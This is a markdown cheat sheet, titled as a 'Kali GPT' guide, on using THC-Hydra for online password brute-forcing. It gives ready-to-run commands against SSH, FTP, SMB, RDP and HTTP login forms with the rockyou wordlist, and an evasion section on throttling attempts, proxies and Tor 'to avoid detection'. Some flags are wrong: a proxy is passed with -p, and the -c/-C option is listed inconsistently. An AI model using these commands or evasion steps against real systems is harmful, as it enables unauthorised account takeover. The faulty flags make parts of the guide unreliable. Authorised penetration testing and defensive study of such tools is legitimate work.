
---

# 🐉 Kali GPT’s Complete Hydra Brute-Force Guide

---

# 📖 **What is Hydra?**

Hydra (also called **THC-Hydra**) is a **fast, flexible, and parallel password cracker**.

It supports **online brute-force attacks** against many services, including:

* HTTP, HTTPS
* FTP
* SSH
* Telnet
* SMB
* VNC
* SMTP
* MySQL
* PostgreSQL
* RDP
* SNMP
* LDAP
* RLogin
* Cisco (AAA, auth)
* and more…

✅ Pre-installed on Kali Linux
✅ Supports dictionary attacks
✅ Supports username & password list combinations

---

# 🚀 **Hydra Basic Syntax**

```bash
hydra [OPTIONS] [TARGET] [PROTOCOL]
```

Example:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh
```

---

# 🔧 **Hydra Core Options Explained**

| Option | Description                                                 |
| ------ | ----------------------------------------------------------- |
| `-l`   | Single username                                             |
| `-L`   | Username list file                                          |
| `-p`   | Single password                                             |
| `-P`   | Password list file                                          |
| `-t`   | Number of parallel connections (default: 16)                |
| `-s`   | Custom port (if not default)                                |
| `-v`   | Verbose output                                              |
| `-V`   | Very verbose (shows each login attempt)                     |
| `-f`   | Exit when a valid login is found                            |
| `-o`   | Output results to a file                                    |
| `-e`   | Try empty password, username as password, and reverse login |
| `-u`   | Loop mode (useful for slow protocols)                       |
| `-c`   | Input from colon-separated login\:pass file                 |
| `-x`   | Brute-force password generation mode                        |
| `-S`   | Use SSL for encrypted services                              |

---

# 🎯 **Supported Protocols (Partial List)**

| Protocol               | Description                           |
| ---------------------- | ------------------------------------- |
| ssh                    | Secure Shell                          |
| ftp                    | File Transfer Protocol                |
| telnet                 | Remote terminal                       |
| smtp                   | Email (Simple Mail Transfer Protocol) |
| http-get / http-post   | Web form authentication               |
| https-get / https-post | Web form (SSL)                        |
| smb                    | Windows shares                        |
| vnc                    | Remote desktop viewer                 |
| rdp                    | Remote Desktop Protocol               |
| mysql                  | MySQL Database                        |
| postgres               | PostgreSQL Database                   |
| snmp                   | Simple Network Management Protocol    |
| ldap2 / ldap3          | Directory authentication              |
| cisco                  | Cisco devices (AAA, auth)             |

---

# ⚔️ **Hydra Real-World Examples**

---

## ✅ 1. SSH Brute-Force (single username)

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh
```

* `-l root` → Username
* `-P` → Password list
* `ssh` → Target protocol

---

## ✅ 2. FTP Brute-Force (custom port)

```bash
hydra -L users.txt -P passlist.txt -s 2121 ftp://192.168.1.100
```

* `-L` → Username list
* `-s 2121` → FTP on port 2121

---

## ✅ 3. HTTP Basic Auth Brute-Force

```bash
hydra -L users.txt -P passwords.txt 192.168.1.100 http-get /admin
```

* Brute-forcing web directories protected by HTTP Basic Authentication.

---

## ✅ 4. HTTP POST Form Brute-Force

```bash
hydra -L users.txt -P passlist.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
```

* Format: `page:POST data:Failure condition`
* `^USER^` and `^PASS^` are replaced automatically.

---

## ✅ 5. SMB Brute-Force

```bash
hydra -L users.txt -P passlist.txt smb://192.168.1.100
```

* Brute-forcing Windows SMB shares.

---

## ✅ 6. RDP Brute-Force (Windows Remote Desktop)

```bash
hydra -t 4 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.100
```

* Uses 4 parallel connections (`-t 4`)
* Very verbose (`-V`)
* Stops on first success (`-f`)

---

## ✅ 7. FTP Anonymous Login Check

```bash
hydra -l anonymous -p anonymous ftp://192.168.1.100
```

---

## ✅ 8. Brute-Force Password Generator (Custom Charset)

```bash
hydra -l admin -x 4:6:a1 192.168.1.100 ssh
```

* `-x 4:6:a1` → Generate passwords from 4 to 6 characters using lowercase letters and numbers.

---

## ✅ 9. Hydra File Input (Login\:Password Pairs)

```bash
hydra -C combo.txt 192.168.1.100 ssh
```

* `combo.txt` → format: username\:password (one pair per line)

---

## ✅ 10. Save Results to File

```bash
hydra -l admin -P pass.txt -o results.txt 192.168.1.100 ssh
```

---

## ✅ 11. Try Empty and Username-as-Password Combinations

```bash
hydra -L users.txt -P pass.txt -e ns 192.168.1.100 ssh
```

* `-e ns` → Try null password (`n`) and username as password (`s`).

---

## ✅ 12. Use Proxy to Obfuscate Source

```bash
hydra -L users.txt -P pass.txt -s 8080 -p http-proxy://127.0.0.1:8080 192.168.1.100 http-get
```

---

# 🧰 **Hydra Tips and Best Practices**

* 🔸 Always perform scans with permission.
* 🔸 Start with small password lists to avoid detection.
* 🔸 Limit parallel connections to prevent lockouts.
* 🔸 For HTTPS logins, ensure you're using `https-get` or `https-post`.
* 🔸 Use the `-f` flag to save time and stop when a valid password is found.
* 🔸 Combine Hydra with Burp Suite to capture HTTP POST requests for form-based brute-forcing.

---

# 🐚 **How to Capture Login Form Structure for Hydra**

1. Intercept login request with **Burp Suite.**

2. Extract:

   * HTTP POST target (example: `/login.php`)
   * POST body (example: `username=^USER^&password=^PASS^`)
   * Failure condition (example: "Invalid login")

3. Build Hydra syntax:

```bash
hydra -L users.txt -P pass.txt 192.168.1.100 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid login"
```

---

# ⚙️ **Hydra Session Handling**

You can resume interrupted sessions:

```bash
hydra -R
```

(If the session was previously aborted with `CTRL+C`.)

---

# 🛡️ **Common Hydra Evasion Techniques**

* Slow the scan:

```bash
hydra -t 1 -w 10 ...
```

(1 thread, 10-second wait between attempts)

* Use multiple proxies.

* Use VPN or Tor (but Hydra doesn’t natively support Tor circuit changes.)

---

# ⚡ **Hydra vs Medusa vs Ncrack**

| Feature          | Hydra      | Medusa    | Ncrack    |
| ---------------- | ---------- | --------- | --------- |
| Speed            | Fast       | Faster    | Fast      |
| Modules          | Very broad | Moderate  | Fewer     |
| Stability        | Excellent  | Excellent | Excellent |
| Parallelism      | Yes        | Yes       | Yes       |
| Real-Time Resume | Yes        | Yes       | Yes       |

👉 Hydra is the most feature-rich of the three.

---

# ✅ Hydra Summary Cheat Sheet

| Command | Purpose                        |
| ------- | ------------------------------ |
| `-l`    | Single username                |
| `-L`    | Username list                  |
| `-p`    | Single password                |
| `-P`    | Password list                  |
| `-s`    | Custom port                    |
| `-t`    | Number of threads              |
| `-v`    | Verbose                        |
| `-V`    | Show each attempt              |
| `-f`    | Stop after first success       |
| `-o`    | Save results                   |
| `-x`    | Brute-force password generator |
| `-e ns` | Try null/username-as-password  |

---

 
